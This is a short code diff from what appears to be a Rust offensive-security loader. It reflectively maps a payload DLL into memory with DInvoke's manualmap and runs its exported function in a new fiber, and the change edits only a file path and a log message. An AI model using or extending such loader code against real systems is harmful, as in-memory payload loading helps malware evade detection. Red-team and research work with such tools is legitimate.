@@ -29,8 +29,8 @@ fn main() {
         let first_fiber = r.unwrap();
 
         // We reflectively map the payload in memory using DInvoke.
-        let dll = manualmap::read_and_map_module(r"..\payload\target\release\payload.dll").unwrap();
-        println!("[Loader] Payload reflectively loaded at memory address 0x{:x}", dll.1);
+        let dll = manualmap::read_and_map_module(r"..\..\..\payload\target\release\payload.dll").unwrap();
+        println!("[Loader] Payload mapped at memory address 0x{:x}", dll.1);
 
         // We create a new fiber to execute the run() function exported on the payload dll.
         let r: Option<PVOID>;
